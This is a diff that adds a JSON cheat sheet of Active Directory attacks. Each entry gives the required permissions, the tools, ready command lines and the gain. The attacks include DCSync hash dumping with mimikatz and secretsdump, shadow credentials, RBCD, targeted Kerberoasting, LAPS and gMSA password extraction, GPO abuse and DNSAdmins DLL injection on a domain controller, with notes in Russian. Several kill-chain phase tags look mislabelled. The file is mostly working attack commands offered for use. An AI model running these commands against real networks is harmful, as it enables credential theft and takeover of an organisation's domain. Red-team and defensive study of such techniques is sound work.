@@ -1,0 +1,202 @@
+[
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "DCSync",
+    "tool": "mimikatz / secretsdump.py",
+    "req": "Administrators, Domain Admins, Enterprise Admins, Domain Controller computer accounts",
+    "command": "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator ; secretsdump.py '<domain>/'<user>':'<password>'@'<domain_controller>'",
+    "profit": "Domain Admin, Lateral move, Crack hash",
+    "critical_note": "Синхронизация хешей паролей с контроллера домена (MS-DRSR).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "Shadow Credentials (msDS-KeyCredentialLink)",
+    "tool": "certipy / pywhisker.py",
+    "req": "Generic Write on msDS-KeyCredentialLink + ADCS",
+    "command": "certipy shadow auto -u <user>@<domain> -p <password> -account <target_account> ; pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\"",
+    "profit": "PassTheCertificate",
+    "critical_note": "Внедрение Key Credential для аутентификации через PKINIT.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On Group: Write Owner",
+    "tool": "PowerView / AD Module",
+    "req": "Write Owner on Group",
+    "command": "Set-DomainObjectOwner -Identity <TargetGroup> -OwnerIdentity <Attacker> (Implied generic command)",
+    "profit": "Grant Ownership -> WriteDACL",
+    "critical_note": "Захват владения объектом группы для дальнейшей модификации прав (DACL).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On Group: Write DACL",
+    "tool": "PowerView / AD Module",
+    "req": "WriteDACL + WriteOwner on Group",
+    "command": "Add-DomainObjectAcl -TargetIdentity <TargetGroup> -PrincipalIdentity <Attacker> -Rights All (Implied generic command)",
+    "profit": "Grant rights -> Give yourself generic all",
+    "critical_note": "Изменение списков контроля доступа (DACL) для выдачи полных прав (GenericAll).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On Group: Add Member",
+    "tool": "PowerView / AD Module",
+    "req": "GenericAll / GenericWrite / Self / Add Extended Rights on Group",
+    "command": "Add-DomainGroupMember -Identity <TargetGroup> -Members <Attacker> (Implied generic command)",
+    "profit": "Add member to the group",
+    "critical_note": "Добавление произвольного пользователя (себя) в привилегированную группу.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On Computer: RBCD",
+    "tool": "PowerView / Impacket",
+    "req": "GenericAll / GenericWrite on Computer -> msDS-AllowedToActOnBehalf",
+    "command": "Set-DomainObject -Identity <Computer> -Set @{'msDS-AllowedToActOnBehalf'=...} (Implied generic command)",
+    "profit": "RBCD (Resource Based Constrained Delegation)",
+    "critical_note": "Настройка делегирования на ресурсе для компрометации компьютера.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On Computer: Shadow Credentials",
+    "tool": "certipy / pywhisker",
+    "req": "GenericAll / GenericWrite on Computer -> add Key Credentials",
+    "command": "См. раздел Shadow Credentials",
+    "profit": "shadow credentials",
+    "critical_note": "Добавление Key Credentials к объекту компьютера для получения TGT.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On User: Change Password",
+    "tool": "net user",
+    "req": "GenericAll / GenericWrite on User -> Change password",
+    "command": "net user <user> <password> /domain",
+    "profit": "User with clear text pass",
+    "critical_note": "Смена пароля пользователя при наличии полных прав на объект.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On User: Targeted Kerberoasting",
+    "tool": "targetedKerberoast.py",
+    "req": "GenericAll / GenericWrite on User -> add SPN",
+    "command": "targetedKerberoast.py -d <domain> -u <user> -p <pass>",
+    "profit": "Hash found (TGS)",
+    "critical_note": "Установка SPN для запроса TGS билета и последующего брутфорса (Kerberoasting).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On User: Shadow Credentials",
+    "tool": "certipy / pywhisker",
+    "req": "GenericAll / GenericWrite on User -> add key credentials",
+    "command": "См. раздел Shadow Credentials",
+    "profit": "shadow credentials",
+    "critical_note": "Добавление Key Credentials к объекту пользователя.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On User: Login Script",
+    "tool": "PowerView / AD Module",
+    "req": "GenericAll / GenericWrite on User -> login script",
+    "command": "Set-DomainObject -Identity <User> -Set @{'scriptPath'='\\\\path\\to\\malicious.bat'} (Implied)",
+    "profit": "Access",
+    "critical_note": "Модификация logon-скрипта пользователя для выполнения кода при входе.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On User: Force Change Password",
+    "tool": "net user",
+    "req": "ForceChangePassword",
+    "command": "net user <user> <password> /domain",
+    "profit": "User with clear text pass",
+    "critical_note": "Принудительный сброс пароля без знания старого (Extended Right).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On OU: Write Dacl",
+    "tool": "PowerView / AD Module",
+    "req": "Write Dacl on OU",
+    "command": "N/A (Manual ACL modification)",
+    "profit": "ACE Inheritance -> Grant rights",
+    "critical_note": "Изменение ACL на OU с наследованием прав на дочерние объекты.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "On OU: GPO Links",
+    "tool": "OUned.py",
+    "req": "GenericAll / GenericWrite / Manage Group Policy Links on OU",
+    "command": "OUned.py --config config.ini",
+    "profit": "Access via GPO link manipulation",
+    "critical_note": "Линковка вредоносной GPO к организационной единице.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "Read GMSA Password",
+    "tool": "gMSADumper.py / nxc / ldeep",
+    "req": "ReadGMSAPassword",
+    "command": "gMSADumper.py -u '<user>' -p '<password>' -d '<domain>' ; nxc ldap <ip> -u <user> -p <pass> --gmsa ; ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> gmsa",
+    "profit": "GMSA Password (NTLM hash)",
+    "critical_note": "Чтение пароля GMSA аккаунта, доступного для чтения определенным пользователям.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "Get LAPS Passwords",
+    "tool": "PowerShell / ldeep / nxc / Metasploit",
+    "req": "Read LAPS / Who can read LAPS",
+    "command": "Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize ; ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps ; foreach ($objResult in $colResults){... Get-AdmPwdPassword ...} ; nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps ; msf> use post/windows/gather/credentials/enum_laps",
+    "profit": "Admin (Local Admin Password)",
+    "critical_note": "Извлечение паролей локальных администраторов (LAPS) из атрибутов AD.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "GPO Discovery (Creation)",
+    "tool": "PowerShell",
+    "req": "SID of principals that can create new GPOs in the domain",
+    "command": "Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=blah,DC=com\" -ResolveGUIDs | ? {$_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl",
+    "profit": "Reconnaissance",
+    "critical_note": "Поиск принципалов, имеющих право создавать новые объекты групповых политик.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "GPO Discovery (Linking)",
+    "tool": "PowerShell",
+    "req": "Principals that can write to the GP-Link attribute on OUs",
+    "command": "Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl",
+    "profit": "Reconnaissance",
+    "critical_note": "Поиск принципалов, имеющих право линковать GPO к OU.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "GPO Abuse",
+    "tool": "SharpGPOAbuse / PowerView",
+    "req": "Generic Write on GPO",
+    "command": "Abuse GPO (Implied tool usage like SharpGPOAbuse)",
+    "profit": "ACCESS",
+    "critical_note": "Модификация существующей GPO для выполнения команд или добавления пользователей.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "ACLs/ACEs permissions",
+    "attack_type": "DNS Admin Abuse",
+    "tool": "dnscmd.exe / sc",
+    "req": "DNSAdmins abuse (CVE-2021-40469)",
+    "command": "dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll> ; sc \\\\DNSServer stop dns sc \\\\DNSServer start dns",
+    "profit": "Admin (SYSTEM code execution on DC)",
+    "critical_note": "Инъекция DLL в службу DNS на контроллере домена через права группы DNSAdmins.",
+    "kill_chain_phase": "PRIVESC"
+  }
+]
